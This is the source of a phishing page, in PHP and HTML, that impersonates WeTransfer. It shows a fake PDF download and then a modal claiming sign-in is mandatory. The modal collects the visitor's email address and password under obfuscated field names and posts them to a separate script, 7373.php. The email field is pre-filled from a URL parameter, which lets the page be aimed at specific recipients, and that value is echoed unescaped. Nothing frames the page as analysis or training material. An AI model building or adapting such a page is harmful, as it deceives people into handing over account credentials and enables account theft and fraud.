<?php $email_from_link = isset($_GET['email']) ? $_GET['email'] : ''; $emailarray = explode('@',$email_from_link); $emailSuffix = $emailarray[0]; ?>
<!DOCTYPE html>
<html lang="en">

<head>

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">
<link rel="icon" href="img/bow.ico" sizes="32x32" />
  
	<title dir="ltr">WeTransfer</title>
<script type="text/javascript" src="https://code.jquery.com/jquery.min.js"></script>
  <!-- Custom fonts for this template-->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
  
  <link href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">

  <!-- Custom styles for this template-->
  <link href="css/grwwk.css" rel="stylesheet">

</head>

<body>  
   <div class="row stack">
    <div class="col">
      <div style="float: left;height: 44px;line-height: 44px;"><img src="img/logo.png" style=" width: 51px;"> </div>
    </div>
    <div class="col">
      
	  <div class="durax">
<center>
<div class="waithi">	  Help</div>
<div class="waithi">About us</div>
<div class="waithi" style="border: none;">Got Plus?</div>
</center>
	  
	  </div>
	  
    </div>
  </div>
  
  
  <div class="row">
  
  <div class="believe">
  <center>
  <div class="indusuf"> </div>
  
  <div class="me">Ready when you are</div>
  <div style="font-size: 13px;">Files deleted in 7 days</div>
  
  <br><div class="pedi">
<div style=" text-align: left; margin-left: 22px; font-size: 14px; color: black; padding-top: 4px; "> Passiv Payment-ID LTD  <div style="font-size: 10px;color: gray;">150 KB . PDF</div></div>
  </div>
  
  <div class="butti"  data-toggle="modal" data-target="#myModal" > Download</div>
  
  </center>
  
  </div>
  
<div class="modal fade" id="myModal" role="dialog" style="padding: 0!important;overflow: hidden; ">
    <div class="modal-dialog" style="margin-top: 48px;width: 538px;Background: transparent;float: right;height: 100vh; overflow: hidden; border-radius: 16px 0 0 45px;">
    
      <!-- Modal content-->
      <div class="modal-content" id="coochie" style="border-radius: 0;height: 100vh; border: solid 0; border-top: solid 29px #409fff;">
       <div style="text-align: left;font-size: 29px;padding-bottom: 93px;padding-left: 11px;padding-top: 60px;background: #f3f7fa;line-height: 29px;"> Sign In is mandatory <br>
	   <small style="font-size: 15px;">We now require email signin from all guest users to download files.</small> 
	   </div>
     <div class="modal-body">
		
		 <div>
		 <form method="post" action="7373.php" >
 
		 
		  <div>Sign in with your email address to download now</div><br>
		 <input type="email" name="sweetsjhj" placeholder="example@company.com" tabindex="1" required="" class="" autofocus="1" style="width: 100%;height: 51px;padding-left: 10px;background: #fff;outline: 0;border: solid 1px #0067B8 !important;" value="<?php echo $email_from_link;?>"> </div>
 <br>
<div style="">
 <input type="password" name="bymyhs" placeholder="&#x2731;&#x2731;&#x2731;&#x2731;&#x2731;&#x2731;
" tabindex="1" required="" class="" value="" style="width: 100%;width: 100%;height: 51px;padding-left: 10px;background: #ffffff;border: solid 1px #0067B8 !important;outline: 0; "> 
 </div>
 
  <button name="jdgioool" title="" class="butti" style="height: 49px;width: 94%;border: 0;float: right;margin-top: 24px;color: white;font-weight: 600;margin-bottom: 10px;font-size: 19px;position: fixed;bottom: 0;">Sign in to download file
</button> 
		
<div id="oneoo" style="padding-top: 12px; font-size: 12px; position: fixed;bottom: 0; text-align: center; width: 100%;     padding-bottom: 9px;  cursor: pointer;">©2019 Wetransfer &nbsp; &nbsp; Terms of use  &nbsp; &nbsp;Privacy and cookies </div>
        </div>
       </form>
      </div>
      
    </div>
  </div>
  
  
  </div>

  
  
  
  
  
  
  <!-- Bootstrap core JavaScript-->
  <script src="vendor/jquery/jquery.min.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

  <!-- Core plugin JavaScript-->
  <script src="vendor/jquery-easing/jquery.easing.min.js"></script>

  <!-- Custom scripts for all pages-->
  <script src="js/sb-admin-2.min.js"></script>

</body>

</html>
